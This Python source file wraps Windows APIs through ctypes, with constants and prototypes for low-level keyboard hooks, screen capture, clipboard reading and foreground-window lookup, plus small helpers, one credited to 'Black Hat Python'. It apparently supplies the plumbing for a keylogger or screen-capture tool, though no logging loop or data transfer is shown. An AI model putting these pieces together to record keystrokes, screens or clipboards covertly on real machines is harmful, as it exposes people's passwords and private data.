# -*- encoding: utf-8 -*-

# Place to store various bindings, wrappers, etc
# Reason: to avoid duplication of prototypes

from ctypes import (
    byref, WinDLL, WinError, sizeof, pointer,
    c_int, c_ulong, c_void_p, c_wchar_p,
    CFUNCTYPE, cast,
    c_void_p as LPRECT,
    c_void_p as PSID,
    create_string_buffer,
    create_unicode_buffer,
    Structure,
    POINTER,
    WINFUNCTYPE
)

from ctypes.wintypes import (
    BOOL, DOUBLE, DWORD, HBITMAP, HINSTANCE, HDC, HGDIOBJ, HANDLE,
    HWND, INT, LPARAM, LONG, RECT, UINT, WORD, MSG, HMODULE, HHOOK,
    LPCWSTR, WPARAM, LPVOID, LPSTR, LPWSTR, BYTE, WCHAR, SHORT,
    WPARAM as ULONG_PTR,
    LPARAM as LRESULT,
)

# consts
WH_MOUSE_LL   = 14
WM_MOUSEFIRST = 0x0200

SM_XVIRTUALSCREEN  = 76
SM_YVIRTUALSCREEN  = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
SRCCOPY            = 0xCC0020  # Code de copie pour la fonction BitBlt()##
DIB_RGB_COLORS     = 0

WM_KEYDOWN      = 0x0100
WM_KEYUP        = 0x0101
WM_SYSKEYDOWN   = 0x0104
WM_SYSKEYUP     = 0x0105
WH_KEYBOARD_LL  = 13
VK_CAPITAL      = 0x14 # CAPITAL key
VK_SHIFT        = 0x10 # SHIFT key
VK_LSHIFT       = 0xA0 # LSHIFT key
VK_RSHIFT       = 0xA1 # RSHIFT key
VK_CONTROL      = 0x11 # CTRL key
VK_LCONTROL     = 0xA2 # LCTRL key
VK_RCONTROL     = 0xA3 # RCTRL key
VK_MENU         = 0x12 # ALT key
VK_LMENU        = 0xA4 # ALT key
VK_RMENU        = 0xA5 # ALT+GR key
VK_RETURN       = 0x0D # ENTER key
VK_ESCAPE       = 0x1B
VK_LWIN         = 0x5B
VK_RWIN         = 0x5C

# typedefs
LPMSG     = POINTER(MSG)

def LOWORD(x):
    return x & 0xffff

# trampolines
HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
LOWLEVELKEYBOARDPROC = CFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
MONITORENUMPROC = WINFUNCTYPE(INT, DWORD, DWORD,
                              POINTER(RECT), DOUBLE)
# structures

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ('vkCode',      DWORD),
        ('scanCode',    DWORD),
        ('flags',       DWORD),
        ('time',        DWORD),
        ('dwExtraInfo', ULONG_PTR)
    ]

class BITMAPINFOHEADER(Structure):
    _fields_ = [
        ('biSize',          DWORD),
        ('biWidth',         LONG),
        ('biHeight',        LONG),
        ('biPlanes',        WORD),
        ('biBitCount',      WORD),
        ('biCompression',   DWORD),
        ('biSizeImage',     DWORD),
        ('biXPelsPerMeter', LONG),
        ('biYPelsPerMeter', LONG),
        ('biClrUsed',       DWORD),
        ('biClrImportant',  DWORD)
    ]

class BITMAPINFO(Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', DWORD * 3)
    ]

class POINT(Structure):
    _fields_ = [("x", c_ulong), ("y", c_ulong)]


# libs
user32   = WinDLL('user32')
kernel32 = WinDLL('kernel32')
gdi32    = WinDLL('gdi32')
psapi    = WinDLL('psapi')

# prototypes
GetForegroundWindow = user32.GetForegroundWindow
GetForegroundWindow.restype = HWND
GetForegroundWindow.argtypes = []

GetCurrentProcess          = kernel32.GetCurrentProcess
GetCurrentProcess.restype  = HANDLE
GetCurrentProcess.argtypes = []

GetCurrentProcessId          = kernel32.GetCurrentProcessId
GetCurrentProcessId.restype  = DWORD
GetCurrentProcessId.argtypes = []

OpenProcess          = kernel32.OpenProcess
OpenProcess.restype  = HANDLE
OpenProcess.argtypes = [DWORD, BOOL, DWORD]

LocalAlloc          = kernel32.LocalAlloc
LocalAlloc.restype  = HANDLE
LocalAlloc.argtypes = [PSID, DWORD]

LocalFree           = kernel32.LocalFree
LocalFree.restype   = HANDLE
LocalFree.argtypes  = [HANDLE]

GetModuleBaseNameW = psapi.GetModuleBaseNameW
GetModuleBaseNameW.restype = DWORD
GetModuleBaseNameW.argtypes = [HWND, HMODULE, c_void_p, DWORD]

GetModuleHandleW = kernel32.GetModuleHandleW
GetModuleHandleW.restype = HMODULE
GetModuleHandleW.argtypes = [LPCWSTR]

GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetWindowThreadProcessId.restype = DWORD
GetWindowThreadProcessId.argtypes = (HWND, POINTER(DWORD))

SetTimer            = user32.SetTimer
SetTimer.restype    = ULONG_PTR
SetTimer.argtypes   = (HWND, ULONG_PTR, UINT, c_void_p)

KillTimer           = user32.KillTimer
KillTimer.restype   = BOOL
KillTimer.argtypes  = (HWND, ULONG_PTR)

SetWindowsHookEx = user32.SetWindowsHookExW
SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
SetWindowsHookEx.restype = HHOOK

UnhookWindowsHookEx = user32.UnhookWindowsHookEx
UnhookWindowsHookEx.restype = BOOL
UnhookWindowsHookEx.argtypes = [HHOOK]

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.restype = LRESULT
CallNextHookEx.argtypes = (
    HHOOK,  # _In_opt_ hhk
    c_int,  # _In_     nCode
    WPARAM, # _In_     wParam
    LPARAM) # _In_     lParam

GetMessageW = user32.GetMessageW
GetMessageW.argtypes = (
    LPMSG, # _Out_    lpMsg
    HWND,  # _In_opt_ hWnd
    UINT,  # _In_     wMsgFilterMin
    UINT)  # _In_     wMsgFilterMax

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [HWND]

GetKeyboardState  = user32.GetKeyboardState
GetKeyboardLayout = user32.GetKeyboardLayout
ToUnicodeEx       = user32.ToUnicodeEx
ToAsciiEx         = user32.ToAsciiEx

GetKeyState          = user32.GetKeyState
GetKeyState.restype  = SHORT
GetKeyState.argtypes = [INT]

OpenClipboard     = user32.OpenClipboard
CloseClipboard    = user32.CloseClipboard
GetClipboardData  = user32.GetClipboardData
GetCursorPos      = user32.GetCursorPos

GetSystemMetrics  = user32.GetSystemMetrics
GetSystemMetrics.argtypes = [INT]
GetSystemMetrics.restypes = INT

EnumDisplayMonitors = user32.EnumDisplayMonitors
EnumDisplayMonitors.argtypes = [HDC, LPRECT, MONITORENUMPROC, LPARAM]
EnumDisplayMonitors.restypes = BOOL

GetWindowDC = user32.GetWindowDC
GetWindowDC.argtypes = [HWND]
GetWindowDC.restypes = HDC

GetWindowText = user32.GetWindowTextW
GetWindowText.argtypes = (HWND, LPWSTR, INT)
GetWindowText.restype = c_int

CreateCompatibleDC = gdi32.CreateCompatibleDC
CreateCompatibleDC.argtypes = [HDC]
CreateCompatibleDC.restypes = HDC

CreateCompatibleBitmap = gdi32.CreateCompatibleBitmap
CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
CreateCompatibleBitmap.restypes = HBITMAP

SelectObject = gdi32.SelectObject
SelectObject.argtypes = [HDC, HGDIOBJ]
SelectObject.restypes = HGDIOBJ

BitBlt = gdi32.BitBlt
BitBlt.argtypes = [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD]
BitBlt.restypes = BOOL

GetDIBits = gdi32.GetDIBits
GetDIBits.restypes = INT
GetDIBits.argtypes = [HDC, HBITMAP, UINT, UINT, LPVOID,
    POINTER(BITMAPINFO), UINT]

DeleteObject = gdi32.DeleteObject
DeleteObject.argtypes = [HGDIOBJ]
DeleteObject.restypes = BOOL

# wrappers

#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
def get_current_process():
    hwnd = GetForegroundWindow()

    pid = c_ulong(0)
    GetWindowThreadProcessId(hwnd, byref(pid))

    executable = create_unicode_buffer('\x00', 512)
    h_process = OpenProcess(0x400 | 0x10, False, pid)
    GetModuleBaseNameW(h_process, None, byref(executable), 512)

    window_title = create_unicode_buffer('\x00', 512)

    lpBuffer = cast(byref(window_title), LPWSTR)
    GetWindowText(hwnd, lpBuffer, 512)

    CloseHandle(hwnd)
    CloseHandle(h_process)

    return executable.value, window_title.value

## http://nullege.com/codes/show/src%40t%40h%40thbattle-HEAD%40src%40utils%40pyperclip.py/48/ctypes.windll.user32.OpenClipboard/python
def get_clipboard():
    OpenClipboard(0)
    pcontents = GetClipboardData(13) # CF_UNICODETEXT
    data = c_wchar_p(pcontents).value
    CloseClipboard()
    return data

def get_mouse_xy():
    pt = POINT()
    GetCursorPos(byref(pt))
    return pt.x, pt.y
